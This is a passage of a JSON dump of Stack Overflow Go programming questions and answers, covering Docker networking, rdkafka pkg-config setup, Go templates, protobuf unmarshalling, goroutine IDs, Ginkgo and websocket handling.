"reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 676, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1562891713, "creation_date": 1540321807, "question_id": 52956291, "link": "https://stackoverflow.com/questions/52956291/after-upgrade-from-ubuntu-18-04-to-18-10-no-internet-connection-inside-docker-co", "title": "After upgrade from ubuntu 18.04 to 18.10 no internet connection inside docker container", "body": "<h1>ping to google not working after upgrade host machine ubuntu 18.04 to 18.10</h1>\n\n<h2>my docker file</h2>\n\n<pre><code>FROM golang:1.9\nWORKDIR /go/src/github.com/sohag1990/gingorm-master\nCOPY . .\n</code></pre>\n\n<h2>docker build command</h2>\n\n<pre><code>docker build -t whoshakhawat/go-app .\nbuild success\n</code></pre>\n\n<h2>running container using /bin/bash</h2>\n\n<pre><code>docker run -it whoshakhawat/go-app /bin/bash\n</code></pre>\n\n<h2>ping command inside docker container</h2>\n\n<pre><code>root@62ba0502a1c6:/# ping google.com\nping: google.com: Temporary failure in name resolution\nroot@62ba0502a1c6:/# ping github.com\nping: github.com: Temporary failure in name resolution\n</code></pre>\n\n<p>Everything was fine when it was in Ubuntu-18.04. Thanks:)</p>\n"}, {"tags": ["go", "apache-kafka", "confluent-platform"], "comments": [{"owner": {"reputation": 2672, "user_id": 1288818, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7CfkE.jpg?s=128&g=1", "display_name": "Oleg Butuzov", "link": "https://stackoverflow.com/users/1288818/oleg-butuzov"}, "edited": false, "score": 0, "creation_date": 1540322337, "post_id": 52956290, "comment_id": 92820303, "body": "<a href=\"https://github.com/edenhill/librdkafka/issues/275\" rel=\"nofollow noreferrer\">github.com/edenhill/librdkafka/issues/275</a>"}, {"owner": {"reputation": 124932, "user_id": 2308683, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/eac16c9fc481cb6825f8b3a35f916b5c?s=128&d=identicon&r=PG", "display_name": "OneCricketeer", "link": "https://stackoverflow.com/users/2308683/onecricketeer"}, "edited": false, "score": 0, "creation_date": 1540324605, "post_id": 52956290, "comment_id": 92821328, "body": "Can you show how you set your <code>PKG_CONFIG_PATH</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 3542, "user_id": 5033611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47a91063fb01317639d57d5fc9c9d9c7?s=128&d=identicon&r=PG", "display_name": "ssemilla", "link": "https://stackoverflow.com/users/5033611/ssemilla"}, "edited": false, "score": 0, "creation_date": 1540356461, "post_id": 52961258, "comment_id": 92829185, "body": "Check this out: <a href=\"https://askubuntu.com/questions/210210/pkg-config-path-environment-variable\" title=\"pkg config path environment variable\">askubuntu.com/questions/210210/&hellip;</a>"}], "tags": [], "owner": {"reputation": 3542, "user_id": 5033611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47a91063fb01317639d57d5fc9c9d9c7?s=128&d=identicon&r=PG", "display_name": "ssemilla", "link": "https://stackoverflow.com/users/5033611/ssemilla"}, "is_accepted": false, "score": 0, "last_activity_date": 1540356418, "creation_date": 1540356418, "answer_id": 52961258, "question_id": 52956290, "link": "https://stackoverflow.com/questions/52956290/package-rdkafka-was-not-found-in-the-pkg-config-search-path/52961258#52961258", "title": "Package rdkafka was not found in the pkg-config search path", "body": "<p><code>pkg-config</code> looks at some default directories for the <code>.pc</code> files, typically <code>/usr/lib/pkgconfig</code> and <code>/usr/share/pkgconfig</code>. However some libraries use <code>/usr/local</code> as the their installation prefix.</p>\n\n<p>Try searching for <code>rdkafka.pc</code> in your <code>/usr</code> directory then add the directory to your <code>PKG_CONFIG_PATH</code></p>\n\n<p>e.g. <code>export PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/lib/pkgconfig</code></p>\n\n<p>Edit: Here is a discussion about PKG_CONFIG_PATH: <a href=\"https://askubuntu.com/questions/210210/pkg-config-path-environment-variable\">https://askubuntu.com/questions/210210/pkg-config-path-environment-variable</a></p>\n"}, {"tags": [], "owner": {"reputation": 2859, "user_id": 6225565, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iqBej.jpg?s=128&g=1", "display_name": "Shalauddin Ahamad Shuza", "link": "https://stackoverflow.com/users/6225565/shalauddin-ahamad-shuza"}, "is_accepted": false, "score": 4, "last_activity_date": 1579120476, "last_edit_date": 1579120476, "creation_date": 1560363964, "answer_id": 56568314, "question_id": 52956290, "link": "https://stackoverflow.com/questions/52956290/package-rdkafka-was-not-found-in-the-pkg-config-search-path/56568314#56568314", "title": "Package rdkafka was not found in the pkg-config search path", "body": "<pre><code>git clone https://github.com/edenhill/librdkafka.git\ncd librdkafka\n./configure --prefix /usr\nmake\nsudo make install\nexport PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/lib/pkgconfig/\n</code></pre>\n\n<p>See <a href=\"https://github.com/edenhill/librdkafka\" rel=\"nofollow noreferrer\">doc</a> for details</p>\n"}], "owner": {"reputation": 21, "user_id": 3954941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3765e53b579fa2b09f1582000003d320?s=128&d=identicon&r=PG&f=1", "display_name": "prashun javeri", "link": "https://stackoverflow.com/users/3954941/prashun-javeri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3565, "favorite_count": 1, "answer_count": 2, "score": 2, "last_activity_date": 1579120476, "creation_date": 1540321787, "last_edit_date": 1540324573, "question_id": 52956290, "link": "https://stackoverflow.com/questions/52956290/package-rdkafka-was-not-found-in-the-pkg-config-search-path", "title": "Package rdkafka was not found in the pkg-config search path", "body": "<p>Package rdkafka was not found in the pkg-config search path.</p>\n\n<p>Confluent go package is throwing error like so </p>\n\n<pre><code># pkg-config --cflags  -- rdkafka\nPackage rdkafka was not found in the pkg-config search path.\nPerhaps you should add the directory containing `rdkafka.pc'\nto the PKG_CONFIG_PATH environment variable\nNo package 'rdkafka' found\npkg-config: exit status 1\n</code></pre>\n\n<p>how do I fix this ? I tried adding it to the path but no dice ! any suggestions ?</p>\n"}, {"tags": ["templates", "go"], "answers": [{"tags": [], "owner": {"reputation": 452, "user_id": 4334369, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/164mz.jpg?s=128&g=1", "display_name": "sieberts", "link": "https://stackoverflow.com/users/4334369/sieberts"}, "is_accepted": false, "score": 1, "last_activity_date": 1540324647, "creation_date": 1540324647, "answer_id": 52956933, "question_id": 52956159, "link": "https://stackoverflow.com/questions/52956159/saving-html-to-a-golang-template-variables/52956933#52956933", "title": "Saving HTML to a golang template variables", "body": "<p>You can concatenate strings in templates with <code>print</code>:</p>\n\n<pre><code> {{ $DUMMY := (print .var1 \" is equal to \" .var2 )}}\n</code></pre>\n"}], "owner": {"reputation": 295, "user_id": 5040972, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/e471a2ed96ad811cd44e8df446571b20?s=128&d=identicon&r=PG&f=1", "display_name": "Iliketoproveit", "link": "https://stackoverflow.com/users/5040972/iliketoproveit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 695, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1540324647, "creation_date": 1540321262, "question_id": 52956159, "link": "https://stackoverflow.com/questions/52956159/saving-html-to-a-golang-template-variables", "title": "Saving HTML to a golang template variables", "body": "<p>I am using go-lang templates to output some HTML.  There is a block of HTML that I will like to repeat many times.  So I am using a variable to store this block of HTML.  Here is a dummy version of my code:</p>\n\n<pre><code>package main\n\nimport (\n    \"html/template\"\n    \"log\"\n    \"os\"\n)\n\nvar tmplString = `    // content of index.html\n    {{define \"index\"}}\n    {{ $DUMMY := \"{{.var1}} is equal to {{.var2}}\"  }}\n    {{ $DUMMY }}\n    {{ $DUMMY }}\n    {{end}}\n`\n\nfunc main() {\n    tmpl, err := template.New(\"test\").Parse(tmplString)\n    if err != nil {\n        log.Fatal(err)\n    }\n    varmap := map[string]interface{}{\n        \"var1\": \"value\",\n        \"var2\": 100,\n    }\n    tmpl.ExecuteTemplate(os.Stdout, \"index\", varmap)\n\n}\n</code></pre>\n\n<p>The problem is that this piece of code will </p>\n\n<pre><code>{{.var1}} is equal to {{.var2}}\n{{.var1}} is equal to {{.var2}}\n</code></pre>\n\n<p>But I need it to produce</p>\n\n<pre><code>value is equal to 100\nvalue is equal to 100\n</code></pre>\n\n<p>How can I define a variable so that the string gets built from my structure?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 4, "creation_date": 1540319636, "post_id": 52955728, "comment_id": 92819005, "body": "No, because the value is never read, the write is pointless."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 3, "creation_date": 1540319839, "post_id": 52955728, "comment_id": 92819101, "body": "Remember that <code>p</code> is just your loop variable. Writing to <code>p</code> has no impact on your <code>pointers</code> slice or any of its elements."}, {"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 1, "creation_date": 1540328523, "post_id": 52955728, "comment_id": 92822986, "body": "Dunno why the downvotes.  It is obvious once you know"}], "answers": [{"tags": [], "owner": {"reputation": 193, "user_id": 9957458, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YonLx.jpg?s=128&g=1", "display_name": "Radu Ciurlea", "link": "https://stackoverflow.com/users/9957458/radu-ciurlea"}, "is_accepted": true, "score": 4, "last_activity_date": 1540327991, "creation_date": 1540327991, "answer_id": 52957690, "question_id": 52955728, "link": "https://stackoverflow.com/questions/52955728/writing-to-a-pointer-but-the-compiler-still-complains-unused-variable/52957690#52957690", "title": "writing to a pointer but the compiler still complains unused variable", "body": "<p>P is only scoped to the loop block and essentially gets a copy of a <code>pointers</code> slice element every time it goes through the loop. This would work though:</p>\n\n<pre><code>package main\n\nimport \"fmt\"\n\nfunc main() {\n    pointers := make([]*int, 5)\n\n    a := 1 // create an int\n\n    for i := range pointers {\n        pointers[i] = &amp;a\n    }\n    fmt.Println(pointers)\n}\n</code></pre>\n\n<p><a href=\"https://play.golang.org/p/10cCFs3r5p8\" rel=\"nofollow noreferrer\">Playground</a></p>\n"}], "owner": {"reputation": 2658, "user_id": 1616210, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/pKBwj.jpg?s=128&g=1", "display_name": "qweruiop", "link": "https://stackoverflow.com/users/1616210/qweruiop"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 52957690, "answer_count": 1, "score": -1, "last_activity_date": 1540327991, "creation_date": 1540319595, "question_id": 52955728, "link": "https://stackoverflow.com/questions/52955728/writing-to-a-pointer-but-the-compiler-still-complains-unused-variable", "title": "writing to a pointer but the compiler still complains unused variable", "body": "<p>The following code causes a compilation error:</p>\n\n<blockquote>\n  <p>main.go:8:9: p declared and not used    </p>\n</blockquote>\n\n<pre><code>package main\n\nfunc main() {\n    pointers := make([]*int, 5)\n\n    a := 1 // create an int\n\n    for _, p := range pointers {\n        p = &amp;a\n    }\n}\n</code></pre>\n\n<p>Writing to <code>p</code> doesn't count as using it?</p>\n"}, {"tags": ["json", "go", "protocol-buffers"], "answers": [{"comments": [{"owner": {"reputation": 9777, "user_id": 121631, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85801ee3b7b70969f6713aaa5768ca20?s=128&d=identicon&r=PG", "display_name": "David Budworth", "link": "https://stackoverflow.com/users/121631/david-budworth"}, "edited": false, "score": 0, "creation_date": 1540321699, "post_id": 52955711, "comment_id": 92820022, "body": "since Saurav is using gogo proto, you probably want gogo&#39;s version of jsonpb which I think is slightly different: <a href=\"https://github.com/gogo/protobuf/blob/master/jsonpb/jsonpb.go\" rel=\"nofollow noreferrer\">github.com/gogo/protobuf/blob/master/jsonpb/jsonpb.go</a>"}], "tags": [], "owner": {"reputation": 7522, "user_id": 2142441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/1296edcd40a8fb8af4086e1544fcc2a9?s=128&d=identicon&r=PG", "display_name": "mattes", "link": "https://stackoverflow.com/users/2142441/mattes"}, "is_accepted": false, "score": 4, "last_activity_date": 1540319544, "creation_date": 1540319544, "answer_id": 52955711, "question_id": 52955253, "link": "https://stackoverflow.com/questions/52955253/unable-to-unmarshal-json-to-protobuf-struct-field/52955711#52955711", "title": "Unable to unmarshal json to protobuf struct field", "body": "<p>You can use <a href=\"https://godoc.org/github.com/golang/protobuf/jsonpb\" rel=\"nofollow noreferrer\">github.com/golang/protobuf/jsonpb</a> to convert JSON to protobuf. </p>\n\n<pre><code>req := proto.JobCreateRequest{}\njsonpb.Unmarshal(r.Body, &amp;req)\n</code></pre>\n"}], "owner": {"reputation": 1627, "user_id": 4007003, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/0a1eb5a369aae01bcd84544bf749d2d7?s=128&d=identicon&r=PG&f=1", "display_name": "Saurav Prakash", "link": "https://stackoverflow.com/users/4007003/saurav-prakash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7357, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1540326070, "creation_date": 1540317939, "last_edit_date": 1540326070, "question_id": 52955253, "link": "https://stackoverflow.com/questions/52955253/unable-to-unmarshal-json-to-protobuf-struct-field", "title": "Unable to unmarshal json to protobuf struct field", "body": "<p>I have a proto file similar to this.</p>\n\n<pre><code>syntax = \"proto3\";\npackage proto;\nimport \"github.com/gogo/protobuf/gogoproto/gogo.proto\";\nimport \"google/protobuf/struct.proto\";\n\n\nmessage JobCreateRequest {\n    string Name = 1 [(gogoproto.jsontag) = \"name\", (gogoproto.moretags)= \"validate:\\\"required,max=100\\\"\"];\n    string Description = 2 [(gogoproto.jsontag) = \"description\", (gogoproto.moretags) = \"validate:\\\"required,max=100\\\"\"];\n    google.protobuf.Value Data = 3 [(gogoproto.jsontag) = \"data\", (gogoproto.moretags) = \"validate:\\\"required\\\"\"];\n}\n</code></pre>\n\n<p>I am trying to unmarshal below json into protobuf using \"encoding/json\" library:</p>\n\n<pre><code>{\n \"name\": \"India\",\n \"description\": \"test job\",\n \"data\": { \n    \"id\": 1 \n  }\n}\n</code></pre>\n\n<p>The code to decode request json to protobuf is:</p>\n\n<pre><code>json.NewDecoder(r.Body).Decode(req)\n</code></pre>\n\n<p>But the resulting Data field inside JobCreateRequest struct is always set to <strong>nil</strong>. What is the right way to use struct Value in protobuf?</p>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"reputation": 2178, "user_id": 3067964, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvonS.jpg?s=128&g=1", "display_name": "jwells131313", "link": "https://stackoverflow.com/users/3067964/jwells131313"}, "edited": false, "score": 0, "creation_date": 1540331086, "post_id": 52955944, "comment_id": 92823817, "body": "I&#39;ve got a package that surfaces a unique ID for goroutines started with the api in the package if you are interested:  github.com/jwells131313/goethe.  Also has some nice utilities around these threads like thread-local storage and the like"}], "tags": [], "owner": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "is_accepted": false, "score": 1, "last_activity_date": 1540321448, "last_edit_date": 1540321448, "creation_date": 1540320358, "answer_id": 52955944, "question_id": 52954948, "link": "https://stackoverflow.com/questions/52954948/are-the-goroutine-numbers-shown-in-a-stack-trace-reused-or-incremented-in-golang/52955944#52955944", "title": "Are the goroutine numbers shown in a stack trace reused or incremented in golang?", "body": "<p>If the king is named Henry VIII, does this mean that Henrys I to VII are still alive? These are just numbers to distinguish one from another.</p>\n\n<p>It is an id of goroutine. You cannot conclude that it is a number of alive goroutines. It is similar to the process id in the operating system. The ids are <a href=\"https://github.com/golang/go/search?utf8=%E2%9C%93&amp;q=goidcache&amp;type=\" rel=\"nofollow noreferrer\">cached</a> and some may not be used.</p>\n\n<p>To see how id of goroutine is generated search for <a href=\"https://github.com/golang/go/search?q=goidgen&amp;unscoped_q=goidgen\" rel=\"nofollow noreferrer\">goidgen</a> in Go source code.</p>\n\n<p>In Linux only process 0 is special in Go only goroutine 1 (main) is special.</p>\n\n<p>See <a href=\"https://golang.org/doc/faq#no_goroutine_id\" rel=\"nofollow noreferrer\">Why is there no goroutine ID?</a></p>\n\n<blockquote>\n  <p>Goroutines do not have names; they are just anonymous workers. They expose no unique identifier, name, or data structure to the programmer. Some people are surprised by this, expecting the go statement to return some item that can be used to access and control the goroutine later. </p>\n</blockquote>\n"}], "owner": {"reputation": 491, "user_id": 7655137, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5203fc333c6443affb37aa2209267d71?s=128&d=identicon&r=PG&f=1", "display_name": "darkwing", "link": "https://stackoverflow.com/users/7655137/darkwing"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 210, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1540321448, "creation_date": 1540316643, "question_id": 52954948, "link": "https://stackoverflow.com/questions/52954948/are-the-goroutine-numbers-shown-in-a-stack-trace-reused-or-incremented-in-golang", "title": "Are the goroutine numbers shown in a stack trace reused or incremented in golang?", "body": "<p>Haven't found any information about what the goroutine \"numbers\" in a stack trace mean exactly. A Google search brings up some references about <a href=\"https://www.ardanlabs.com/blog/2015/01/stack-traces-in-go.html\" rel=\"nofollow noreferrer\">interpreting stack traces</a> and <a href=\"https://groups.google.com/forum/#!topic/golang-nuts/txNixC7Rhug\" rel=\"nofollow noreferrer\">posts</a> that seem to indicate that numbers are resused, but no definitive question and answer asked that I can find. </p>\n\n<p>Are the numbers shown in a Go stack trace reused or are they incremented? If I see a large number does that mean there are at least that many goroutines currently alive? </p>\n\n<p>For example, consider the following stack trace:</p>\n\n<pre><code>goroutine 127590 [running]:\ncrypto/sha256.(*digest).checkSum(0xc042bb57d8, 0x0, 0x0, 0x0, 0x0)\n    /usr/local/go/src/crypto/sha256/sha256.go:247 +0x26d\n</code></pre>\n\n<p>Does this mean there are 127590 goroutines currently running? </p>\n"}, {"tags": ["go", "bdd", "ginkgo"], "comments": [{"owner": {"reputation": 24447, "user_id": 603316, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4db0c2cbf2d5c9c196902dfc9db8218d?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/603316/peter"}, "edited": false, "score": 0, "creation_date": 1540323840, "post_id": 52952354, "comment_id": 92820996, "body": "&quot;0 Skipped&quot; means you&#39;re not skipping anything."}, {"owner": {"reputation": 407, "user_id": 3461549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73440cf71c71747a010d5114de459b10?s=128&d=identicon&r=PG&f=1", "display_name": "msound", "link": "https://stackoverflow.com/users/3461549/msound"}, "edited": false, "score": 0, "creation_date": 1540323936, "post_id": 52952354, "comment_id": 92821034, "body": "From the documentation, it appears that Skip() works at spec level and not at test suite level."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10547047, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_A5GwQWgxAs/AAAAAAAAAAI/AAAAAAAAAA0/LaekMr-ltHY/photo.jpg?sz=128", "display_name": "Juan Manuel Tirado Martin", "link": "https://stackoverflow.com/users/10547047/juan-manuel-tirado-martin"}, "edited": false, "score": 0, "creation_date": 1540366403, "post_id": 52957200, "comment_id": 92833278, "body": "OK I see. I&#39;m surprised there is not a direct way to simply skip a test suite from the BeforeSuite."}], "tags": [], "owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "is_accepted": true, "score": 0, "last_activity_date": 1540325711, "creation_date": 1540325711, "answer_id": 52957200, "question_id": 52952354, "link": "https://stackoverflow.com/questions/52952354/ginkgo-skipped-specs-counted-as-failed/52957200#52957200", "title": "Ginkgo skipped specs counted as failed", "body": "<p>I think you are using <code>Skip</code> method incorrectly. It should be use inside spec like below, not inside <code>BeforeSuite</code>. When used inside spec it does show up as \"skipped\" in the summary. </p>\n\n<pre><code>It(\"should do something, if it can\", func() {\n    if !someCondition {\n        Skip(\"special condition wasn't met\")\n    }\n})\n</code></pre>\n\n<p><a href=\"https://onsi.github.io/ginkgo/#the-spec-runner\" rel=\"nofollow noreferrer\">https://onsi.github.io/ginkgo/#the-spec-runner</a></p>\n"}], "owner": {"reputation": 13, "user_id": 10547047, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_A5GwQWgxAs/AAAAAAAAAAI/AAAAAAAAAA0/LaekMr-ltHY/photo.jpg?sz=128", "display_name": "Juan Manuel Tirado Martin", "link": "https://stackoverflow.com/users/10547047/juan-manuel-tirado-martin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 581, "favorite_count": 0, "accepted_answer_id": 52957200, "answer_count": 1, "score": 0, "last_activity_date": 1540325711, "creation_date": 1540307272, "question_id": 52952354, "link": "https://stackoverflow.com/questions/52952354/ginkgo-skipped-specs-counted-as-failed", "title": "Ginkgo skipped specs counted as failed", "body": "<p>I've being using Ginkgo for a while and I have found a behavior I don't really understand. I have a set of specs that I only want to run if and only if a condition is available. If the condition is not available I want to skip the test suite.</p>\n\n<p>Something like this:</p>\n\n<pre><code>   ginkgo.BeforeSuite(func(){\n    if !CheckCondition() {\n        ginkgo.Skip(\"condition not available\")\n    } \n   }\n</code></pre>\n\n<p>When the suite is skipped this counts as a failure.</p>\n\n<pre><code>FAIL! -- 0 Passed | 1 Failed | 0 Pending | 0 Skipped\n</code></pre>\n\n<p>I assumed there should be one tests to be considered to be skipped. Am I missing something? Any comments are welcome.</p>\n\n<p>Thnaks</p>\n"}, {"tags": ["go", "websocket", "gorilla"], "answers": [{"comments": [{"owner": {"reputation": 15050, "user_id": 227523, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/b97b3c40da63bfe514d79b88d565e9d2?s=128&d=identicon&r=PG", "display_name": "Kirzilla", "link": "https://stackoverflow.com/users/227523/kirzilla"}, "edited": false, "score": 0, "creation_date": 1540328588, "post_id": 52957777, "comment_id": 92823011, "body": "Hey, thank you! Yep, solved in similar way. Messages have event_id. But I\u2019m not doing any kind of filtering messages because underlying storage just merges them on unique key. Thank yoy!"}], "tags": [], "owner": {"reputation": 193, "user_id": 9957458, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YonLx.jpg?s=128&g=1", "display_name": "Radu Ciurlea", "link": "https://stackoverflow.com/users/9957458/radu-ciurlea"}, "is_accepted": true, "score": 1, "last_activity_date": 1540328438, "creation_date": 1540328438, "answer_id": 52957777, "question_id": 52951936, "link": "https://stackoverflow.com/questions/52951936/swap-websocket-connections-when-one-of-them-was-closed/52957777#52957777", "title": "Swap websocket connections when one of them was closed", "body": "<p>If the messages have ids (they should), you can listen for them on several goroutines which reconnect if needed. The goroutines can forward the messages via a channel to a filter goroutine which only forwards unique messages, e.g. keep a map using seen message ids as keys. The map can be pruned periodically so it doesn't accumulate ids which are too old and no longer relevant.</p>\n"}], "owner": {"reputation": 15050, "user_id": 227523, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/b97b3c40da63bfe514d79b88d565e9d2?s=128&d=identicon&r=PG", "display_name": "Kirzilla", "link": "https://stackoverflow.com/users/227523/kirzilla"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 52957777, "answer_count": 1, "score": 0, "last_activity_date": 1540328438, "creation_date": 1540306017, "question_id": 52951936, "link": "https://stackoverflow.com/questions/52951936/swap-websocket-connections-when-one-of-them-was-closed", "title": "Swap websocket connections when one of them was closed", "body": "<p>Using <code>gorilla/websocket</code> I'm connecting to some websocket (wss) endpoint and listening messages (only reading, not writing - this is important). This endpoint is always forcing closing connections after 10 minutes. Handling connection closing and reconnect will probably cause some incoming messages lost. How to handle connection in this case?</p>\n\n<p>My suggestion is to keep pool of connections (2 connections or more). When first connection is being closed we can start using another (already connected) connection and start preparing new connection (or just reconnect). What do you think? Any drawbacks? \"Swap\" connections means stop using one gorouting and switch to another? Any ideas?</p>\n\n<p>Important to note:</p>\n\n<ul>\n<li>Endpoint is just broadcasting messages to all connections. No personalized messages, no authentification, no session-specific state etc.</li>\n<li>Just reading, no writing at all.</li>\n</ul>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"reputation": 662, "user_id": 1887912, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cb3aa8025d2e06f2adac3f3a8a6388de?s=128&d=identicon&r=PG", "display_name": "JonB", "link": "https://stackoverflow.com/users/1887912/jonb"}, "edited": false, "score": 0, "creation_date": 1540308228, "post_id": 52952194, "comment_id": 92813087, "body": "now the <code>assert.Errorf</code> if always invoked, how can that be prevented?"}, {"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "reply_to_user": {"reputation": 662, "user_id": 1887912, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cb3aa8025d2e06f2adac3f3a8a6388de?s=128&d=identicon&r=PG", "display_name": "JonB", "link": "https://stackoverflow.com/users/1887912/jonb"}, "edited": false, "score": 0, "creation_date": 1540308537, "post_id": 52952194, "comment_id": 92813282, "body": "er sorry thught that what you intended!  How about <code>assert.NotNilf(t, err, &quot;error message %v&quot;, err)</code>"}, {"owner": {"reputation": 662, "user_id": 1887912, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cb3aa8025d2e06f2adac3f3a8a6388de?s=128&d=identicon&r=PG", "display_name": "JonB", "link": "https://stackoverflow.com/users/1887912/jonb"}, "edited": false, "score": 0, "creation_date": 1540308807, "post_id": 52952194, "comment_id": 92813435, "body": "this is what I got <code>FAIL | --- FAIL: TestSdk (1.62s)      |     sdk_test.go:50:      |         \tError Trace:\tsdk_test.go:50      |         \tError:      \tExpected value not to be nil.      |         \tTest:       \tTestSdk      |         \tMessages:   \terror message &lt;nil&gt;</code>"}], "tags": [], "owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "is_accepted": false, "score": 0, "last_activity_date": 1540307792, "last_edit_date": 1540307792, "creation_date": 1540306819, "answer_id": 52952194, "question_id": 52951913, "link": "https://stackoverflow.com/questions/52951913/stretchr-testify-assert-just-giving-stack-trace-missing-actual-error-message/52952194#52952194", "title": "stretchr/testify/assert just giving stack trace, missing actual error message", "body": "<p>Instead of <code>defer sdk.GovClient.Logout(ctx)</code> try <code>defer func() { if (ctx!=nil) { sdk.GovClient.Logout(ctx) }</code></p>\n\n<p>The second panic is from this defer on an incorrect ctx</p>\n\n<p>(I don't have the vmwareSDK in front of me here, the key thing is to check that the sdk.GovClient.Logout has a valid parameter before attempting it)</p>\n"}], "owner": {"reputation": 662, "user_id": 1887912, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cb3aa8025d2e06f2adac3f3a8a6388de?s=128&d=identicon&r=PG", "display_name": "JonB", "link": "https://stackoverflow.com/users/1887912/jonb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 390, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1540307792, "creation_date": 1540305952, "question_id": 52951913, "link": "https://stackoverflow.com/questions/52951913/stretchr-testify-assert-just-giving-stack-trace-missing-actual-error-message", "title": "stretchr/testify/assert just giving stack trace, missing actual error message", "body": "<p>I have this following test that I would like to convert to use <code>github.com/stretchr/testify/assert</code> import, what would be best practice to get this done ?\nCode as is now:</p>\n\n<pre><code>func TestSdk(t *testing.T) {\n    ctx := context.Background()\n\n    sdk, err := NewSdk(ctx)\n    if err != nil {\n        t.Errorf(\"Unable to get VMware SDK: %v\", err)\n    }\n\n    defer sdk.GovClient.Logout(ctx)\n}\n</code></pre>\n\n<blockquote>\n  <p>Error: FAIL | --- FAIL: TestSdk (0.00s)\n       |     sdk_test.go:48: <strong>Unable to get VMware SDK: Please set environment variables: HCI_ENDPOINT, HCI_USERNAME and HCI_PASSWORD</strong>\n       | panic: runtime error: invalid memory address or nil pointer dereference [recovered]\n       |    panic: runtime error: invalid memory address or nil pointer dereference\n       | [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x151cc31]\n       | goroutine 6 [running]:\n       | testing.tRunner.func1(0xc00019a100)\n       |    